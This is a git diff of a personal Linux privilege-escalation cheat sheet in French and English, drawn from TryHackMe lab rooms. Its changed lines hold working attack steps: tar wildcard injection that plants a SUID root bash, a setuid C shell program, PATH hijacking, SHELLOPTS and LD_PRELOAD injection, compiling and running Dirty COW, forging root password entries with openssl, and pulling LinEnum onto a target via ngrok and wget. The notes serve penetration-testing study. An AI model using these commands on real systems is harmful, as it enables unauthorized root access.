@@ -2,16 +2,19 @@
 There are just a bunch of notes which I took from TryHackMe rooms and i always need   
 Don't take this repo to seriously  :)
 
+# Elévation des privilèges : 
+
 ### Scripts : 
 LinEnum -> comme LinPeas  
 Enumerate privEsc factors  
 linux-exploit-suggester.sh  
 
 ### Mettre LinEnum sur la machine cible :
-	- python3 -m http.server 8000 		-> Ouvre une serveur web python en local
-	- ngrok http 8000			-> Port forwarding
-	- wget https://ngrok.io:port/linEnum.sh		-> copie le fichier sur la machine vulnérable
-		
+```bash
+python3 -m http.server 8000 				-> Ouvre une serveur web python en local
+ngrok http 8000								-> Port forwarding
+wget https://ngrok.io:port/linEnum.sh		-> copie le fichier sur la machine vulnérable
+```
 
 ### A la main :  
 ### ABUSING SUID FILES :  
@@ -57,9 +60,9 @@ modifier le password du root / creer un nouvel account avec des perms root
 ```bash
 openssl passwd -1 -salt [salt] [password]
 ```
-ou
+ou juste
 ```bash
-ou juste : openssl passwd [newpassword]
+openssl passwd [newpassword]
 ```
 
 ***FORMAT PASSWD :***
@@ -89,13 +92,13 @@ mkpasswd -m sha-512 newpasswordhere
 
 ### SHELL ESCAPE : https://gtfobins.github.io
 ```bash
-$sudo -l  
+sudo -l  
 ```
 
 ### EXLOITING CRON JOBS :
-- view which ones are actives : 
+view which ones are actives : 
 ```bash
-$cat /etc/crontab
+cat /etc/crontab
 ```
 On regarde si certains se lance avec des droits root et si on peut les modifier  
 Si oui, il y a la place pour un reverse shell  
@@ -178,13 +181,13 @@ nc -nvlp 4444
 #### ROOTBASH
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
-2. touch /home/user/--checkpoint=1
-3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\ runme.sh
 ```
 
-4. Wait 1 minute for the Bash script to execute.
+Wait 1 minute for the Bash script to execute.
 ```bash
-5. In command prompt type: /tmp/bash -p
+In command prompt type: /tmp/bash -p
 ```
 
 ### EXPLOITING PATH VARIABLE
@@ -196,14 +199,14 @@ echo $PATH
 On commence par cree le faux script
 ```bash
 cd /tmp
-$echo "[whatever command we want to run]" > [name of the executable we're imitating] 
+echo "[whatever command we want to run]" > [name of the executable we're imitating] 
 ```
 
 ***exemple : ***
 ```bash
 echo "/bin/bash" > ls
-$chmod +x filename	-> x rend le fichier executable
-$export PATH=/tmp:$PATH -> on met /tmp dans le PATH
+chmod +x filename	-> x rend le fichier executable
+export PATH=/tmp:$PATH -> on met /tmp dans le PATH
 ```
 
 et on réexecute le file
@@ -227,7 +230,7 @@ ssh -i id_rsa username@ipaddress
 ```
 
 ### NFS root_squashing
-```
+```bash
 cat /etc/exports -> ici on avait trouvé no_root_squash
 ```
 sur notre machine :
@@ -271,7 +274,7 @@ sudo LD_PRELOAD=/tmp/x.so apache2
 ### SUID/SGID SHARED OBJECTS INJECTION
 ( On cherche les SUID qu'il manque pour les recreer )
 ```bash
-└─strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
 ```
 From the output, notice that a .so file is missing from a writable directory.
 ***.so is compiled .c***
@@ -309,7 +312,7 @@ For this exploit, it is required that the user be www-data
 At this stage, the system waits for logrotate to execute (THIS CAN BE LONG)  
 
 ### SUID/SGID EVIRONNEMENT VARIABLE
-```
+```bash
 sudo -l / output suid-env
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
 gcc /tmp/service.c -o /tmp/service
@@ -322,15 +325,17 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash &&
 ```
 
 ### KERNEL EXPLOIT :
-1 ) run the linux exploit suggester_pl   
+1 ) run the linux exploit suggester_pl 
+```bash  
 perl PATH/SCRIPT.PL  
+```
 2 ) use the desired vuln : here dirty cow  
 compile :
 ```bash
 gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 ```
 run and let it finish : 
-```
+```bash
 ./c0w	
 /usr/bin/passwd	-> allow to gain te root shell
 ```
@@ -346,12 +351,13 @@ From the output, notice the value of the “cap_setuid” capability.
 ```
 
 
-Les endroits où faire des recherches:
+## Les endroits où faire des recherches:
+```
 https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
 https://payatu.com/guide-linux-privilege-escalation
-
+```
 
 
 # CHEATSHEET 
